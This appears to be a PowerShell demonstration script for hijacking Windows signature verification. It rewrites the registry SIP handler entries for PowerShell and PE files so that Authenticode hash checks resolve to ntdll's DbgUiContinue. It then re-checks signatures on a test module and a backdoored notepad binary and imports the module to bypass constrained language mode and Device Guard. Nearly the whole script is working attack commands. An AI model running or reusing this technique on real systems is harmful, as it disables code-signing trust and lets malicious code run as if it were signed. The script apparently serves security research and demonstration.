$Host.Runspace.LanguageMode

Get-AuthenticodeSignature -FilePath C:\Demo\bypass_test.psm1
Get-AuthenticodeSignature -FilePath C:\Demo\notepad_backdoored.exe

# Try to execute the script. Add-Type will fail.
Import-Module C:\Demo\bypass_test.psm1

$VerifyHashFunc = 'HKLM:\SOFTWARE\Microsoft\Cryptography' +
                  '\OID\EncodingType 0\CryptSIPDllVerifyIndirectData'

$PowerShellSIPGuid = '{603BCC1F-4B59-4E08-B724-D2C6297EF351}'
$PESIPGuid = '{C689AAB8-8E78-11D0-8C47-00C04FC295EE}'

$PSSignatureVerifier = Get-Item -Path "$VerifyHashFunc\$PowerShellSIPGuid\"
$PESignatureVerifier = Get-Item -Path "$VerifyHashFunc\$PESIPGuid\"

# Signed code reuse attack that will effectively return TRUE when the
# digitial signature hash validation function is called.
$NewDll = 'C:\Windows\System32\ntdll.dll'
$NewFuncName = 'DbgUiContinue'

$PSSignatureVerifier | Set-ItemProperty -Name Dll -Value $NewDll
$PSSignatureVerifier | Set-ItemProperty -Name FuncName -Value $NewFuncName
$PESignatureVerifier | Set-ItemProperty -Name Dll -Value $NewDll
$PESignatureVerifier | Set-ItemProperty -Name FuncName -Value $NewFuncName

##################
# Start a new process for the hijack to take effect.
powershell

Get-AuthenticodeSignature -FilePath C:\Demo\bypass_test.psm1
Get-AuthenticodeSignature -FilePath C:\Demo\notepad_backdoored.exe

# Demo constrained language mode bypass and Device Guard bypass.
Import-Module C:\Demo\bypass_test.psm1

exit
###################